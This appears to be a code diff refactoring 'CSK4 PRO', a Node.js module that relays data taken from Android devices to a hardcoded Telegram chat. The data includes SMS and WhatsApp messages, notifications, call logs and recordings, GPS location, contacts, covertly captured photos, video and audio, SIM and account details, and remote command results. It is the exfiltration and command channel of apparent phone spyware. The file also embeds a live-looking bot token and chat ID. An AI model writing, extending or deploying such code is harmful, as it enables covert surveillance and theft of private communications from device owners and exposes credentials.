@@ -1,27 +1,25 @@
 // ============================================
-// CSK4 PRO v4.0 - Telegram Bot Integration
+// CSK4 PRO v4.1 - Telegram Bot Integration (FIXED)
 // ============================================
-// Ye file Telegram Bot se connect karti hai
-// Aur instant notifications bhejti hai
-// Email se FAST — 1-2 second mein
+// Fixes:
+// - Queue memory leak (max 500)
+// - Better rate limit
+// - File sending exports
 // ============================================
 
 const TelegramBot = require('node-telegram-bot-api');
 
-// ============ CONFIG ============
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 
   '8393657326:AAFvHQjOcbgKqcMpiFn8lQbZtc3VipPXUvI';
 
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 
   '8181910370';
 
-// ============ STATE ============
 let bot = null;
 let isEnabled = false;
 let messageQueue = [];
 let isSending = false;
 
-// ============ RATE LIMIT ============
 const RATE_LIMIT = {
   maxPerMinute: 20,
   maxPerSecond: 1,
@@ -31,7 +29,8 @@ const RATE_LIMIT = {
   secondReset: Date.now()
 };
 
-// ============ INITIALIZE BOT ============
+const MAX_QUEUE = 500; // ✅ prevent memory leak
+
 function init() {
   if (!BOT_TOKEN || !CHAT_ID) {
     console.log('⚠️ Telegram not configured — skipping');
@@ -39,18 +38,11 @@ function init() {
   }
 
   try {
-    bot = new TelegramBot(BOT_TOKEN, { 
-      polling: false,  // We don't need to receive messages
-      webHook: false
-    });
-
+    bot = new TelegramBot(BOT_TOKEN, { polling: false, webHook: false });
     isEnabled = true;
     console.log('📱 Telegram Bot initialized');
     console.log(`   Chat ID: ${CHAT_ID}`);
-
-    // Send startup message
     sendMessage('🟢 <b>CSK4 Server Started</b>\n\nServer is online and ready to receive data.');
-
     return true;
   } catch (error) {
     console.error('❌ Telegram init failed:', error.message);
@@ -59,11 +51,8 @@ function init() {
   }
 }
 
-// ============ RATE LIMIT CHECK ============
 function canSend() {
   const now = Date.now();
-
-  // Reset counters
   if (now - RATE_LIMIT.minuteReset > 60000) {
     RATE_LIMIT.sentThisMinute = 0;
     RATE_LIMIT.minuteReset = now;
@@ -72,37 +61,24 @@ function canSend() {
     RATE_LIMIT.sentThisSecond = 0;
     RATE_LIMIT.secondReset = now;
   }
-
-  // Check limits
-  if (RATE_LIMIT.sentThisMinute >= RATE_LIMIT.maxPerMinute) {
-    return false;
-  }
-  if (RATE_LIMIT.sentThisSecond >= RATE_LIMIT.maxPerSecond) {
-    return false;
-  }
-
+  if (RATE_LIMIT.sentThisMinute >= RATE_LIMIT.maxPerMinute) return false;
+  if (RATE_LIMIT.sentThisSecond >= RATE_LIMIT.maxPerSecond) return false;
   RATE_LIMIT.sentThisMinute++;
   RATE_LIMIT.sentThisSecond++;
   return true;
 }
 
-// ============ SEND MESSAGE ============
 async function sendMessage(text, options = {}) {
-  if (!isEnabled || !bot) {
-    console.log('⚠️ Telegram not enabled, skipping message');
-    return false;
-  }
-
-  // Rate limit
+  if (!isEnabled || !bot) return false;
   if (!canSend()) {
-    console.log('⚠️ Telegram rate limit — queueing message');
+    // ✅ Drop oldest instead of growing forever
+    if (messageQueue.length >= MAX_QUEUE) messageQueue.shift();
     messageQueue.push({ text, options });
     processQueue();
     return false;
   }
-
   try {
-    const result = await bot.sendMessage(CHAT_ID, text, {
+    await bot.sendMessage(CHAT_ID, text, {
       parse_mode: 'HTML',
       disable_web_page_preview: true,
       ...options
@@ -114,17 +90,14 @@ async function sendMessage(text, options = {}) {
   }
 }
 
-// ============ PROCESS QUEUE ============
 async function processQueue() {
   if (isSending || messageQueue.length === 0) return;
   isSending = true;
-
   while (messageQueue.length > 0) {
     if (!canSend()) {
       await new Promise(r => setTimeout(r, 2000));
       continue;
     }
-
     const msg = messageQueue.shift();
     try {
       await bot.sendMessage(CHAT_ID, msg.text, {
@@ -136,362 +109,149 @@ async function processQueue() {
       console.error('❌ Queue send failed:', error.message);
     }
   }
-
   isSending = false;
 }
 
-// ============ SEND PHOTO ============
 async function sendPhoto(photoUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
-
+  if (!isEnabled || !bot || !canSend()) return false;
   try {
-    await bot.sendPhoto(CHAT_ID, photoUrl, {
-      caption: caption,
-      parse_mode: 'HTML'
-    });
+    await bot.sendPhoto(CHAT_ID, photoUrl, { caption, parse_mode: 'HTML' });
     return true;
-  } catch (error) {
-    console.error('❌ Telegram photo failed:', error.message);
-    return false;
-  }
+  } catch (e) { console.error('TG photo:', e.message); return false; }
 }
 
-// ============ SEND DOCUMENT (Audio/Video) ============
+async function sendVideo(videoUrl, caption = '') {
+  if (!isEnabled || !bot || !canSend()) return false;
+  try {
+    await bot.sendVideo(CHAT_ID, videoUrl, { caption, parse_mode: 'HTML' });
+    return true;
+  } catch (e) { console.error('TG video:', e.message); return false; }
+}
+
 async function sendDocument(documentUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
-
+  if (!isEnabled || !bot || !canSend()) return false;
   try {
-    await bot.sendDocument(CHAT_ID, documentUrl, {
-      caption: caption,
-      parse_mode: 'HTML'
-    });
+    await bot.sendDocument(CHAT_ID, documentUrl, { caption, parse_mode: 'HTML' });
     return true;
-  } catch (error) {
-    console.error('❌ Telegram document failed:', error.message);
-    return false;
-  }
+  } catch (e) { console.error('TG doc:', e.message); return false; }
 }
 
-// ============ SEND AUDIO ============
 async function sendAudio(audioUrl, caption = '') {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
-
+  if (!isEnabled || !bot || !canSend()) return false;
   try {
-    await bot.sendAudio(CHAT_ID, audioUrl, {
-      caption: caption,
-      parse_mode: 'HTML'
-    });
+    await bot.sendAudio(CHAT_ID, audioUrl, { caption, parse_mode: 'HTML' });
     return true;
-  } catch (error) {
-    console.error('❌ Telegram audio failed:', error.message);
-    return false;
-  }
+  } catch (e) { console.error('TG audio:', e.message); return false; }
 }
 
-// ============ SEND LOCATION ============
 async function sendLocation(lat, lng) {
-  if (!isEnabled || !bot) return false;
-  if (!canSend()) return false;
-
+  if (!isEnabled || !bot || !canSend()) return false;
   try {
     await bot.sendLocation(CHAT_ID, lat, lng);
     return true;
-  } catch (error) {
-    console.error('❌ Telegram location failed:', error.message);
-    return false;
-  }
+  } catch (e) { console.error('TG loc:', e.message); return false; }
 }
 
-// ============ NOTIFICATION TEMPLATES ============
-
-// 🆕 Device Online
+// ============ TEMPLATES ============
 async function notifyDeviceOnline(deviceName, deviceId, model, android, battery) {
-  const text = `🟢 <b>Device Online</b>
-
-📱 <b>Name:</b> ${escapeHtml(deviceName)}
-🆔 <b>ID:</b> <code>${deviceId}</code>
-📲 <b>Model:</b> ${escapeHtml(model)}
-🤖 <b>Android:</b> ${android}
-🔋 <b>Battery:</b> ${battery}%
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`🟢 <b>Device Online</b>\n\n📱 <b>Name:</b> ${escapeHtml(deviceName)}\n🆔 <b>ID:</b> <code>${deviceId}</code>\n📲 <b>Model:</b> ${escapeHtml(model)}\n🤖 <b>Android:</b> ${android}\n🔋 <b>Battery:</b> ${battery}%\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📍 Location Update
 async function notifyLocation(deviceName, lat, lng, accuracy) {
   const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
-  const text = `📍 <b>Location Update</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-🗺️ <b>Coordinates:</b> <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>
-🎯 <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}
-
-<a href="${mapsUrl}">🗺️ Open in Maps</a>
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`📍 <b>Location Update</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n🗺️ <b>Coords:</b> <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n🎯 <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}\n\n<a href="${mapsUrl}">🗺️ Open in Maps</a>\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 💬 New SMS
 async function notifySMS(deviceName, from, body, senderName) {
-  const displayFrom = senderName && senderName !== 'Unknown' 
-    ? `${escapeHtml(senderName)} (${from})` 
-    : from;
-  
-  const text = `💬 <b>New SMS</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-👤 <b>From:</b> ${displayFrom}
-📝 <b>Message:</b>
-<i>${escapeHtml(body)}</i>
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  const displayFrom = senderName && senderName !== 'Unknown' ? `${escapeHtml(senderName)} (${from})` : from;
+  return await sendMessage(`💬 <b>New SMS</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${displayFrom}\n📝 <b>Message:</b>\n<i>${escapeHtml(body)}</i>\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 💬 WhatsApp Message
 async function notifyWhatsApp(deviceName, from, message) {
-  const text = `💬 <b>WhatsApp Message</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-👤 <b>From:</b> ${escapeHtml(from)}
-📝 <b>Message:</b>
-<i>${escapeHtml(message)}</i>
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`💬 <b>WhatsApp Message</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${escapeHtml(from)}\n📝 <b>Message:</b>\n<i>${escapeHtml(message)}</i>\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🔔 Notification
 async function notifyNotification(deviceName, appName, title, text) {
-  const message = `🔔 <b>Notification</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-📲 <b>App:</b> ${escapeHtml(appName)}
-📌 <b>Title:</b> ${escapeHtml(title || 'No title')}
-📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(message);
+  return await sendMessage(`🔔 <b>Notification</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📲 <b>App:</b> ${escapeHtml(appName)}\n📌 <b>Title:</b> ${escapeHtml(title || 'No title')}\n📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📞 Call
 async function notifyCall(deviceName, number, name, type, duration) {
-  const typeEmoji = {
-    1: '📥', 2: '📤', 3: '❌', 4: '📮', 5: '🚫', 6: '⏱️'
-  };
-  const typeText = {
-    1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'
-  };
-
-  const text = `${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-👤 <b>From:</b> ${escapeHtml(name || 'Unknown')}
-📞 <b>Number:</b> <code>${number}</code>
-⏱️ <b>Duration:</b> ${duration}s
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  const typeEmoji = { 1:'📥', 2:'📤', 3:'❌', 4:'📮', 5:'🚫', 6:'⏱️' };
+  const typeText = { 1:'Incoming', 2:'Outgoing', 3:'Missed', 4:'Voicemail', 5:'Rejected', 6:'Blocked' };
+  return await sendMessage(`${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${escapeHtml(name || 'Unknown')}\n📞 <b>Number:</b> <code>${number}</code>\n⏱️ <b>Duration:</b> ${duration}s\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🆕 New Contact
 async function notifyContact(deviceName, name, phone, type) {
-  const text = `🆕 <b>New Contact</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-👤 <b>Name:</b> ${escapeHtml(name)}
-📞 <b>Phone:</b> <code>${phone}</code>
-📱 <b>Type:</b> ${type || 'Mobile'}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`🆕 <b>New Contact</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>Name:</b> ${escapeHtml(name)}\n📞 <b>Phone:</b> <code>${phone}</code>\n📱 <b>Type:</b> ${type || 'Mobile'}\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📷 Photo
 async function notifyPhoto(deviceName, photoUrl) {
-  const caption = `📷 <b>Photo Captured</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendPhoto(photoUrl, caption);
+  return await sendPhoto(photoUrl, `📷 <b>Photo Captured</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🎥 Video
 async function notifyVideo(deviceName, videoUrl) {
-  const caption = `🎥 <b>Video Recorded</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendDocument(videoUrl, caption);
+  return await sendVideo(videoUrl, `🎥 <b>Video Recorded</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🎤 Audio
 async function notifyAudio(deviceName, audioUrl) {
-  const caption = `🎤 <b>Audio Recorded</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendAudio(audioUrl, caption);
+  return await sendAudio(audioUrl, `🎤 <b>Audio Recorded</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🎙️ Call Recording
 async function notifyCallRecording(deviceName, number, duration, audioUrl) {
-  const caption = `🎙️ <b>Call Recording</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-📞 <b>Number:</b> <code>${number}</code>
-⏱️ <b>Duration:</b> ${duration}s
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendDocument(audioUrl, caption);
+  return await sendDocument(audioUrl, `🎙️ <b>Call Recording</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📞 <b>Number:</b> <code>${number}</code>\n⏱️ <b>Duration:</b> ${duration}s\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📊 Activity
 async function notifyActivity(deviceName, type, data) {
-  const text = `📊 <b>Activity: ${type}</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`📊 <b>Activity: ${type}</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🔋 Battery Alert
 async function notifyBattery(deviceName, level, isCharging) {
   const emoji = isCharging ? '🔌' : (level <= 15 ? '🔴' : '🔋');
   const status = isCharging ? 'Charging' : 'On Battery';
-
-  const text = `${emoji} <b>Battery Alert</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-🔋 <b>Level:</b> ${level}%
-⚡ <b>Status:</b> ${status}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`${emoji} <b>Battery Alert</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n🔋 <b>Level:</b> ${level}%\n⚡ <b>Status:</b> ${status}\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📱 SIM Info
 async function notifySimInfo(deviceName, sims) {
   let simText = '';
   if (sims && sims.length > 0) {
     sims.forEach(sim => {
-      simText += `\n<b>SIM ${sim.slot}:</b>\n`;
-      simText += `  📞 ${sim.number || 'N/A'}\n`;
-      simText += `  📡 ${sim.operator || 'N/A'}\n`;
-      simText += `  📶 ${sim.networkType || 'N/A'}\n`;
+      simText += `\n<b>SIM ${sim.slot}:</b>\n  📞 ${sim.number || 'N/A'}\n  📡 ${sim.operator || 'N/A'}\n  📶 ${sim.networkType || 'N/A'}\n`;
     });
   }
-
-  const text = `📱 <b>SIM Info</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-${simText}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`📱 <b>SIM Info</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n${simText}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 👤 Accounts
 async function notifyAccounts(deviceName, accounts) {
   let accText = '';
   if (accounts && accounts.length > 0) {
-    accounts.forEach(acc => {
-      accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`;
-    });
+    accounts.forEach(acc => { accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`; });
   }
-
-  const text = `👤 <b>Accounts Found</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-<b>Total:</b> ${accounts?.length || 0}
-${accText}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`👤 <b>Accounts Found</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n<b>Total:</b> ${accounts?.length || 0}\n${accText}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 📧 Emails
 async function notifyEmails(deviceName, emails) {
   let emailText = '';
-  if (emails && emails.length > 0) {
-    emails.forEach(email => {
-      emailText += `\n📧 ${escapeHtml(email)}`;
-    });
-  }
-
-  const text = `📧 <b>Email Accounts</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-<b>Total:</b> ${emails?.length || 0}
-${emailText}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  if (emails && emails.length > 0) emails.forEach(email => { emailText += `\n📧 ${escapeHtml(email)}`; });
+  return await sendMessage(`📧 <b>Email Accounts</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n<b>Total:</b> ${emails?.length || 0}\n${emailText}\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🎮 Command Result
 async function notifyCommand(deviceName, command, result) {
-  const text = `🎮 <b>Command Executed</b>
-
-📱 <b>Device:</b> ${escapeHtml(deviceName)}
-⚡ <b>Command:</b> <code>${command}</code>
-✅ <b>Result:</b> ${escapeHtml(result)}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`🎮 <b>Command Executed</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⚡ <b>Command:</b> <code>${command}</code>\n✅ <b>Result:</b> ${escapeHtml(result)}\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// 🚨 System Alert
 async function notifySystem(title, message) {
-  const text = `🚨 <b>${escapeHtml(title)}</b>
-
-${escapeHtml(message)}
-
-⏰ ${new Date().toLocaleString()}`;
-  
-  return await sendMessage(text);
+  return await sendMessage(`🚨 <b>${escapeHtml(title)}</b>\n\n${escapeHtml(message)}\n\n⏰ ${new Date().toLocaleString()}`);
 }
 
-// ============ ESCAPE HTML ============
 function escapeHtml(text) {
   if (!text) return '';
-  return String(text)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
+  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
-// ============ TEST ============
 async function test() {
-  const success = await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
-  return success;
+  return await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
 }
 
-// ============ STATUS ============
 function getStatus() {
   return {
     enabled: isEnabled,
@@ -503,34 +263,10 @@ function getStatus() {
   };
 }
 
-// ============ EXPORTS ============
 module.exports = {
-  init,
-  sendMessage,
-  sendPhoto,
-  sendDocument,
-  sendAudio,
-  sendLocation,
-  test,
-  getStatus,
-  
-  // Notification templates
-  notifyDeviceOnline,
-  notifyLocation,
-  notifySMS,
-  notifyWhatsApp,
-  notifyNotification,
-  notifyCall,
-  notifyContact,
-  notifyPhoto,
-  notifyVideo,
-  notifyAudio,
-  notifyCallRecording,
-  notifyActivity,
-  notifyBattery,
-  notifySimInfo,
-  notifyAccounts,
-  notifyEmails,
-  notifyCommand,
-  notifySystem
+  init, sendMessage, sendPhoto, sendVideo, sendDocument, sendAudio, sendLocation, test, getStatus,
+  notifyDeviceOnline, notifyLocation, notifySMS, notifyWhatsApp, notifyNotification,
+  notifyCall, notifyContact, notifyPhoto, notifyVideo, notifyAudio, notifyCallRecording,
+  notifyActivity, notifyBattery, notifySimInfo, notifyAccounts, notifyEmails,
+  notifyCommand, notifySystem
 };
